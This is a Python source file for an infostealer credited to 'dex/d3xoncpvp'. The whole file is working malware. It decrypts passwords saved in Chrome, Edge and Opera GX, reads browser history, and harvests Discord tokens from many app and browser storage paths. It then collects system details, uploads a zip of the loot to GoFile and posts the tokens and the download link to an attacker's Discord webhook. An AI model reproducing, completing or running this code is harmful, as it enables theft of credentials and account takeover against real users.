#coded by dex/d3xoncpvp
#for support add d3xonv3 on discord
#selling this src or project is prohibited

import os
import sqlite3
import json
import base64
import shutil
import requests
import platform
import win32crypt
import re 
import tempfile 
import zipfile 
import glob 



try:
    
    from Cryptodome.Cipher import AES
except ImportError:
    print("Error: Cryptodome not found. Please install pycryptodome or pycryptodomex.")
    print("Run: pip install pycryptodome")
    exit()

try:
    import win32crypt
except ImportError:
    print("Error: pywin32 not found. Please install it.")
    print("Run: pip install pywin32")
    exit()


try:
    import psutil
except ImportError:
    
    psutil = None 


#put youre webhook here
DISCORD_WEBHOOK_URL = "put youre webhook here" 

# WARNING: Using GoFile for unauthorized uploads is illegal and against their terms of service.
GOFILE_API_URL = "https://store4.gofile.io/uploadFile"

# --- Configuration ---
MAX_TOKEN_EMBED_FIELDS = 10
OUTPUT_ZIP_NAME = "collected_data.zip"
EMBED_AUTHOR_NAME = "DEXNET"
# --- End Configuration ---


def get_browser_key(browser_name):
    """Retrieves the browser's encryption key."""
    local_state_path = None
   
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")

    if browser_name == "chrome":
        local_state_path = os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State")
    elif browser_name == "edge":
        local_state_path = os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State")
    elif browser_name == "opera":
        
        local_state_path = os.path.join(appdata, "Opera GX", "User Data", "Local State")

    if not local_state_path or not os.path.exists(local_state_path):
        
        return None # Indicate failure to get key

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            
            return None

        
        key = base64.b64decode(encrypted_key)[5:]
        
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        
        return None


def decrypt_password(password, key):
    """Decrypts a browser password using AES-GCM."""
    if key is None: 
        return "[Key not available]"
    try:
        
        iv = password[3:15]
        ciphertext = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        decrypted_bytes = cipher.decrypt(ciphertext)[:-16]
        
        return decrypted_bytes.decode(errors='ignore')
    except Exception as e:
        
        return "[Could not be decrypted]"


def get_browser_data(browser_name, data_type):
    """Extracts browser passwords or history."""
    data = []
    db_paths = {
        "passwords": "Login Data",
        "history": "History"
        
    }

    
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")

    base_path = None
    
    if browser_name == "chrome":
        base_path = os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default")
    elif browser_name == "edge":
        base_path = os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default")
    elif browser_name == "opera":
        base_path = os.path.join(appdata, "Opera GX", "User Data", "Default") 
    


    if not base_path:
         
         return None 

    db_file_name = db_paths.get(data_type)
    if not db_file_name:
        
        return None

    db_path = os.path.join(base_path, db_file_name)

    if not os.path.exists(db_path):
        
        return None

    
    temp_db = f"temp_{browser_name}_{data_type}_{os.getpid()}.db"
    conn = None
    try:
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        if data_type == "passwords":
            key = get_browser_key(browser_name) 
            if key is None:
                 data.append("[Skipping passwords: Key not available]")
            else:
                
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    
                    if url and username and encrypted_password:
                        decrypted_password = decrypt_password(encrypted_password, key)
                        
                        data.append(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n---")


        elif data_type == "history":
            
            
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200") 
            data = [f"Title: {row[1]}\nURL: {row[0]}" for row in cursor.fetchall()] 
            
            data = [item for item in data if item.strip() and "Title: \nURL: " not in item]


    except Exception as e:
        
        return None 
    finally:
        
        if conn:
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception as e:
                
                pass 

    
    return data 


def steal_discord_tokens():
    """Steals Discord tokens from common locations."""
    
    roaming = os.getenv("APPDATA", "")
    local = os.getenv("LOCALAPPDATA", "")

    paths = [
        os.path.join(roaming, "discord", "Local Storage", "leveldb"),
        os.path.join(roaming, "discordcanary", "Local Storage", "leveldb"),
        os.path.join(roaming, "Lightcord", "Local Storage", "leveldb"),
        os.path.join(roaming, "discordptb", "Local Storage", "leveldb"),
        # Include paths for browsers that might store tokens
        os.path.join(roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
        os.path.join(roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
        os.path.join(local, "Amigo", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Torch", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Kometa", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Orbitum", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "CentBrowser", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "7Star", "7Star", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
        # Add other Vivaldi profiles if needed: os.path.join(local, "Vivaldi", "User Data", "Profile 1", "Local Storage", "leveldb"), etc.
        os.path.join(local, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        # Add other Chrome profiles if needed
        os.path.join(local, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        # Add other Edge profiles if needed
        os.path.join(local, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        # Add other Brave profiles if needed
        os.path.join(local, "Iridium", "User Data", "Default", "Local Storage", "leveldb"),
        # Add paths for Discord development builds or other potential locations if known
        # Example: os.path.join(roaming, "discorddevelopment", "Local Storage", "leveldb"),
    ]

    tokens = []
    token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")

    for path in paths:
        if not path or not os.path.exists(path):
            continue 

        

        for file_name in os.listdir(path):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue

            file_path = os.path.join(path, file_name)
            

            try:
                
                with open(file_path, "r", errors="ignore") as file:
                    content = file.read()
                    
                    found_tokens = token_pattern.findall(content)
                    for token in found_tokens:
                        if token not in tokens: 
                            tokens.append(token)
                            

            except Exception as e:
                
                pass 

    return tokens if tokens else ["[No Discord tokens found]"]


def get_system_info():
    """Gathers basic and optional detailed system information."""
    info = platform.uname()
    system_info = f"Operating System: {info.system} {info.release} ({info.version})\n"
    system_info += f"Computer Name: {info.node}\n"
    system_info += f"Architecture: {info.machine}\n"
    system_info += f"Processor: {info.processor}\n"

    if psutil: 
        try:
            total_ram_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
            system_info += f"RAM: {total_ram_gb} GB\n"
            
        except Exception as e:
            
            system_info += "Note: Error getting detailed info with psutil.\n"
    else:
        system_info += "Note: psutil not installed for more detailed info.\n"

    return system_info


def upload_to_gofile(filepath):
    """Uploads a file to GoFile."""
    if not os.path.exists(filepath):
        print(f"Error: File not found for upload: {filepath}")
        return "Error: File not found for upload"

    try:
        with open(filepath, 'rb') as f:
            
            response = requests.post(GOFILE_API_URL, files={'file': f})
            response.raise_for_status() 
            response_json = response.json()

            if response_json.get('status') == 'ok':
                return response_json.get('data', {}).get('downloadPage', 'Upload successful, no link returned')
            else:
                print(f"GoFile upload failed: {response_json.get('message', 'Unknown error')}")
                return f"Upload failed: {response_json.get('message', 'Unknown error')}"
    except requests.exceptions.RequestException as e:
        print(f"HTTP Request Error during GoFile upload: {e}")
        return f"Upload error: {e}"
    except Exception as e:
        print(f"An unexpected error occurred during GoFile upload: {e}")
        return f"Upload error: {e}"


def send_to_discord(title, description=None, fields=None, author_name=EMBED_AUTHOR_NAME, color=16711680):
    """Sends an embed message with optional fields to the Discord webhook."""
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("Error: Discord webhook URL is not set. Please replace the placeholder.")
        return

    embed_content = {
        "title": title,
        "description": description,
        "color": color, 
        "footer": {"text": "Data Exfiltration Report"},
        "author": {"name": author_name, "icon_url": None}, 
        "fields": fields if fields is not None else [] 
        
    }

    embed = {
        "embeds": [embed_content]
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
        response.raise_for_status() 
        print("Report sent to Discord successfully.")
    except requests.exceptions.RequestException as e:
        print(f"HTTP Request Error sending to Discord: {e}")
        print("Please check your Discord webhook URL.")
    except Exception as e:
        print(f"An unexpected error occurred while sending to Discord: {e}")


def main():
    """Main function to orchestrate data collection and exfiltration."""
    total_passwords_stolen = 0
    
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"Using temporary directory: {temp_dir}")

        print("Attempting to extract browser data...")
        browser_passwords_files = []
        browser_history_files = []

        for browser in ["chrome", "edge", "opera"]: 
            print(f"Extracting data from {browser}...")
            passwords_data = get_browser_data(browser, "passwords")
            history_data = get_browser_data(browser, "history")

            if passwords_data and passwords_data != ["[Skipping passwords: Key not available]"]:
                 
                 password_file = os.path.join(temp_dir, f"{browser}_passwords.txt")
                 with open(password_file, "w", encoding="utf-8") as f:
                     f.write(f"--- {browser.capitalize()} Passwords ---\n\n")
                     f.write("\n".join(passwords_data))
                     total_passwords_stolen += len([p for p in passwords_data if "[Could not be decrypted]" not in p and "[Key not available]" not in p])
                 browser_passwords_files.append(password_file)
                 print(f"  Found {len(passwords_data)} potential passwords for {browser}.")
            else:
                 print(f"  No passwords found or accessible for {browser}.")
                 
                 password_file = os.path.join(temp_dir, f"{browser}_passwords.txt")
                 with open(password_file, "w", encoding="utf-8") as f:
                     f.write(f"--- No {browser.capitalize()} Passwords Found ---\n\n")
                 browser_passwords_files.append(password_file)


            if history_data and history_data != ["[No History found for " + browser.capitalize() + "]"]:
                 
                 history_file = os.path.join(temp_dir, f"{browser}_history.txt")
                 with open(history_file, "w", encoding="utf-8") as f:
                     f.write(f"--- {browser.capitalize()} History ---\n\n")
                     f.write("\n".join(history_data))
                 browser_history_files.append(history_file)
                 print(f"  Found {len(history_data)} history entries for {browser}.")
            else:
                 print(f"  No history found for {browser}.")
                 
                 history_file = os.path.join(temp_dir, f"{browser}_history.txt")
                 with open(history_file, "w", encoding="utf-8") as f:
                     f.write(f"--- No {browser.capitalize()} History Found ---\n\n")
                 browser_history_files.append(history_file)


        print("Attempting to steal Discord tokens...")
        tokens = steal_discord_tokens()
        
        actual_tokens = [t for t in tokens if t != "[No Discord tokens found]"]
        print(f"Found {len(actual_tokens)} potential Discord tokens.")

        
        tokens_file = os.path.join(temp_dir, "discord_tokens.txt")
        with open(tokens_file, "w", encoding="utf-8") as f:
            f.write("--- Discord Tokens ---\n\n")
            if actual_tokens:
                f.write("\n".join(actual_tokens))
            else:
                f.write("[No Discord tokens found]\n")


        print("Gathering system information...")
        system_info = get_system_info()
        print("System info gathered.")

        
        system_info_file = os.path.join(temp_dir, "system_info.txt")
        with open(system_info_file, "w", encoding="utf-8") as f:
            f.write("--- System Information ---\n\n")
            f.write(system_info)


        print(f"Zipping collected data into {OUTPUT_ZIP_NAME}...")
        
        output_zip_path = os.path.join(os.getcwd(), OUTPUT_ZIP_NAME) 
        try:
            with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        zipf.write(file_path, os.path.relpath(file_path, temp_dir))
            print(f"Data successfully zipped to {output_zip_path}")
        except Exception as e:
            print(f"Error creating zip file: {e}")
            output_zip_path = None 


        gofile_link = "Upload failed"
        if output_zip_path and os.path.exists(output_zip_path):
            print(f"Attempting to upload {OUTPUT_ZIP_NAME} to GoFile...")
            gofile_link = upload_to_gofile(output_zip_path)
            print(f"GoFile Link: {gofile_link}")


        
        fields = []

        # System Information Field
        fields.append({
            "name": "💻 System Information",
            "value": system_info,
            "inline": False 
        })

        # Password Count Field
        fields.append({
            "name": "🔒 Passwords Found",
            "value": f"Total passwords potentially stolen: **{total_passwords_stolen}**",
            "inline": False
        })

        
        if actual_tokens:
            for i, token in enumerate(actual_tokens):
                if i < MAX_TOKEN_EMBED_FIELDS:
                    fields.append({
                        "name": f"🔑 Discord Token {i+1}",
                        
                        "value": f"```\n{token}\n```",
                        "inline": False 
                    })
                else:
                    
                    fields.append({
                        "name": f"🔑 More Discord Tokens",
                        "value": f"And {len(actual_tokens) - MAX_TOKEN_EMBED_FIELDS} more tokens are in the uploaded file.",
                        "inline": False
                    })
                    break 

        
        if not actual_tokens and tokens:
             fields.append({
                "name": "🔑 Discord Tokens",
                "value": tokens[0], 
                "inline": False
            })


        
        fields.append({
            "name": "📦 Collected Data Archive",
            "value": f"Link to {OUTPUT_ZIP_NAME}: [Download Here]({gofile_link})" if gofile_link and "Error" not in gofile_link else f"Link to {OUTPUT_ZIP_NAME}: {gofile_link}", 
            "inline": False
        })

        
        send_to_discord("✨ Data Exfiltration Report ✨", description="A new collection of data has been processed.", fields=fields, color=3066993) 


    print("Script finished. Cleaning up.")
    if output_zip_path and os.path.exists(output_zip_path):
        try:
            os.remove(output_zip_path)
            print(f"Cleaned up zip file: {output_zip_path}")
        except Exception as e:
            print(f"Error cleaning up zip file {output_zip_path}: {e}")


if __name__ == "__main__":
    main()